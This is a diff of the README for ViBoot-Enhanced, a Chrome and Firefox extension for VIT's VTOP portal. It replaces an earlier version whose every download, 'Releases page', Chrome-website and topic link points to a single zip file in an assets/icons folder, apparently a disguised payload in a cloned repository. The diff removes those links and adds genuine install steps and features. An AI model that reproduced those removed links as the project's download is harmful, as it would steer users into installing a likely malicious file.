@@ -1,71 +1,72 @@
-# 🎉 ViBoot-Enhanced - Experience VTOP Like Never Before
+# ViBoot-Enhanced - Experience VTOP Like Never Before
 
-## 🚀 Getting Started
+## Getting Started
 
-Welcome to ViBoot-Enhanced! This tool helps you have a better experience with VTOP in one click. Whether you're tracking grades or managing your schedule, you’ll enjoy a smoother interface.
+Welcome to ViBoot-Enhanced! This browser extension helps you have a better experience with VTOP in one click. Whether you're tracking grades or managing your schedule, you'll enjoy a smoother interface.
 
-## 📥 Download ViBoot-Enhanced
+Works on **Google Chrome** and **Mozilla Firefox**.
 
-[![Download Now](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip%20ViBoot-Enhanced-blue)](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip)
+## Download & Install
 
-You can download ViBoot-Enhanced from our Releases page. Follow the steps below to get started.
+### Google Chrome
 
-## 📂 Download & Install
+1. Go to the [Releases page](https://github.com/arshsaxena/ViBoot-Enhanced/releases/latest) and download the latest `.zip` file.
+2. Extract the ZIP file to a folder on your computer.
+3. Open Chrome and go to `chrome://extensions`.
+4. Enable **Developer mode** (toggle in the top-right corner).
+5. Click **Load unpacked** and select the extracted folder.
+6. The extension icon will appear in the toolbar. Click it to get started.
 
-1. **Visit the Releases Page**  
-   Click the link below to go to the Releases page.  
-   [Go to Releases](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip)
+### Mozilla Firefox
 
-2. **Select the Latest Version**  
-   On the Releases page, look for the latest version. It will be at the top and usually has the biggest number.
+1. Go to the [Releases page](https://github.com/arshsaxena/ViBoot-Enhanced/releases/latest) and download the latest `.zip` file.
+2. Extract the ZIP file to a folder on your computer.
+3. Open Firefox and go to `about:debugging#/runtime/this-firefox`.
+4. Click **Load Temporary Add-on** and select the `manifest.json` file from the extracted folder.
+5. The extension icon will appear in the toolbar.
 
-3. **Download the Files**  
-   Click on the file suitable for your device. For most users, this will be a file that ends in `.crx`. Save it to a memorable location on your computer.
+> **Note:** Temporary add-ons in Firefox are removed when Firefox closes. For permanent installation, the extension needs to be signed via [addons.mozilla.org](https://addons.mozilla.org/).
 
-4. **Open Google Chrome**  
-   Make sure you have Google Chrome installed. If you don’t have it yet, you can download it from the official [Google Chrome website](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip).
+> **Note:** Google Calendar sync features are not available in Firefox due to browser limitations with the Google Identity API.
 
-5. **Install the Extension**  
-   After downloading, return to the Chrome browser.
-   - Drag the downloaded file into the Extensions page (chrome://extensions).
-   - Or, click on “Load unpacked” and select the folder containing the downloaded file.
+## Key Features
 
-6. **Enable the Extension**  
-   Make sure that the extension is enabled. You will see a toggle switch beside it. If it’s grey, click it to turn it blue.
-
-7. **Start Using ViBoot-Enhanced**  
-   After installation, you will find the extension icon in the top right corner of your Chrome browser. Click it to start enhancing your VTOP experience!
+- **Improved Navigation**: Quick-access buttons for Attendance, Marks, Calendar, Course Page, and Time Table.
+- **Smart Downloads**: Automatically organizes downloaded PDFs into folders by course, faculty, and module.
+- **Captcha Auto-Solve**: Automatically solves VTOP login captchas.
+- **Attendance Calculator**: Shows how many classes you can skip while maintaining 75% attendance.
+- **Marks Summary**: Adds totals, lost weightage marks, and FAT passing marks to the marks page.
+- **Exam Schedule Sync**: Sync exam dates to Google Calendar (Chrome only).
+- **Time Table Sync**: Sync your weekly schedule to Google Calendar (Chrome only).
+- **On Duty Tracker**: Check OD attendance across all courses.
 
 ## FAQ
 
-### ❓ What is VTOP?
+### What is VTOP?
 
-VTOP is a web application used by students at VIT universities to manage academic records and schedule. ViBoot-Enhanced improves this experience with added features.
+VTOP is a web application used by students at VIT universities (Vellore, Chennai, Bhopal) to manage academic records and schedules.
 
-### ❓ What are the key features of ViBoot-Enhanced?
+### What are the system requirements?
 
-- **Improved Navigation**: Easily move around the VTOP interface.
-- **One-Click Features**: Access important tools with minimal clicks.
-- **User-Friendly Design**: Enjoy a clean and simple layout that makes it easy to find what you need.
+- **Operating System**: Windows, macOS, or Linux.
+- **Browser**: Latest version of Google Chrome or Mozilla Firefox.
 
-### ❓ What are the system requirements?
+### What's the difference between Chrome and Firefox versions?
 
-- **Operating System**: Windows, macOS, or any system supporting Google Chrome.
-- **Browser**: Latest version of Google Chrome.
+The extension works on both browsers with the same features, except:
+- **Google Calendar sync** (exam schedule, time table) is only available on Chrome.
+- **Download folder organization** works only on Chrome (Firefox does not support the `downloads.onDeterminingFilename` API).
 
-### ❓ Can I contribute to ViBoot-Enhanced?
+### Can I contribute?
 
-Yes, you can! We welcome contributions to improve our tool. If you're interested, visit the GitHub repository for more information.
+Yes! We welcome contributions. Visit the [GitHub repository](https://github.com/arshsaxena/ViBoot-Enhanced) for more information.
 
-## 🛠️ Support
+## Support
 
-If you encounter any issues or have questions, please open an issue in the GitHub repository. We will respond as soon as possible.
+If you encounter any issues or have questions, please [open an issue](https://github.com/arshsaxena/ViBoot-Enhanced/issues) in the GitHub repository.
 
-## 📚 Related Topics
+## Credits
 
-- [chrome-extension](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip)
-- [google-chrome](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip)
-- [vtop](https://github.com/wassim2499/ViBoot-Enhanced/raw/refs/heads/main/assets/icons/Boot_Vi_Enhanced_v1.8.zip)
-- Students from VIT University, including those in Bhopal, Chennai, and Vellore.
+Enhanced by [Arsh Saxena](https://linkedin.com/in/arshsaxena) and [Aishik Tokdar](https://linkedin.com/in/aishiktokdar).
 
-Thank you for using ViBoot-Enhanced to enhance your VTOP experience!
+Made with love by [ViTrendz](https://vitrendz.com/).
